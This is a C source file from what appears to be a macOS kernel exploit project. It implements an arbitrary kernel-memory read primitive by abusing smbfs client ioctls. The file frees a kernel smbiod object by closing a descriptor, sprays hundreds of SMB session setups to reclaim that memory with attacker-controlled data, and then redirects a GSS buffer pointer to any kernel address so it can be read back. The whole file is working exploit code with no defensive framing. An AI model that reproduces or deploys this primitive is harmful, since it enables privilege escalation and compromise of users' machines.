//
//  smbiod_rw.c
//  kmem_xepg
//
//  Created by admin on 12/31/21.
//

#include <stdlib.h>
#include <unistd.h>

#include <dispatch/dispatch.h>

#include "../external/smbfs/smb_conn.h"
#include "../smb/client.h"

#include "smbiod_rw.h"
#include "util_assert.h"
#include "util_dispatch.h"


#define KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT 356


struct kmem_smbiod_rw {
    struct sockaddr_in smb_addr;
    int fd_rw;
    int fd_iod;
};


kmem_smbiod_rw_t kmem_smbiod_rw_create(const struct sockaddr_in* smb_addr, int fd_rw, int fd_iod) {
    kmem_smbiod_rw_t rw = malloc(sizeof(struct kmem_smbiod_rw));
    rw->fd_iod = fd_iod;
    rw->fd_rw = fd_rw;
    rw->smb_addr = *smb_addr;
    return rw;
}


void kmem_smbiod_rw_read_iod(kmem_smbiod_rw_t rw, struct smbiod* out) {
    struct smbiod iod1;
    struct smbiod iod2;
    
    uint32_t gss_target_nt;
    int error = smb_client_ioc_auth_info(rw->fd_iod, NULL, UINT32_MAX, NULL, UINT32_MAX, &gss_target_nt);
    xe_assert_err(error);
    
    error = smb_client_ioc_auth_info(rw->fd_rw, (char*)&iod1, sizeof(iod1), (char*)&iod2, sizeof(iod2), NULL);
    xe_assert_err(error);
    
    if (iod1.iod_gss.gss_target_nt == gss_target_nt) {
        *out = iod1;
    } else if (iod2.iod_gss.gss_target_nt == gss_target_nt) {
        *out = iod2;
    } else {
        printf("[ERROR] read failed, gss_target_nt does not match\n");
        abort();
    }
}


void kmem_smbiod_rw_write_iod(kmem_smbiod_rw_t rw, const struct smbiod* value) {
    int* fds_capture = alloca(sizeof(int) * KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        fds_capture[index] = smb_client_open_dev();
        xe_assert(fds_capture[index] >= 0);
        int error = smb_client_ioc_negotiate(fds_capture[index], &rw->smb_addr, sizeof(rw->smb_addr), FALSE);
        xe_assert_err(error);
    });
    
    uint32_t gss_target_nt_base = rand();
    close(rw->fd_rw);
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        struct smbiod iod = *value;
        iod.iod_gss.gss_target_nt = gss_target_nt_base + (int)index;
        int error = smb_client_ioc_ssn_setup(fds_capture[index], (char*)&iod, sizeof(iod), (char*)&iod, sizeof(iod));
        xe_assert_err(error);
    });
        
    uint32_t new_gss_target_nt;
    int error = smb_client_ioc_auth_info(rw->fd_iod, NULL, UINT32_MAX, NULL, UINT32_MAX, &new_gss_target_nt);
    xe_assert_err(error);
    int captured_idx = new_gss_target_nt - gss_target_nt_base;
    xe_assert(captured_idx >= 0 && captured_idx < KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
    rw->fd_rw = fds_capture[captured_idx];
    
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        if (index != captured_idx) {
            close(fds_capture[index]);
        }
    });
}


void kmem_smbiod_rw_read_data(kmem_smbiod_rw_t rw, void* dst, uintptr_t src, size_t size) {
    xe_assert(size <= UINT32_MAX);
    struct smbiod iod;
    kmem_smbiod_rw_read_iod(rw, &iod);
    iod.iod_gss.gss_cpn = (uint8_t*)src;
    iod.iod_gss.gss_cpn_len = (uint32_t)size;
    kmem_smbiod_rw_write_iod(rw, &iod);
    int error = smb_client_ioc_auth_info(rw->fd_iod, (char*)dst, (uint32_t)size, NULL, UINT32_MAX, NULL);
    xe_assert_err(error);
}


void kmem_smbiod_rw_destroy(kmem_smbiod_rw_t* rw_p) {
    kmem_smbiod_rw_t rw = *rw_p;
    close(rw->fd_iod);
    close(rw->fd_rw);
    free(rw);
    *rw_p = NULL;
}
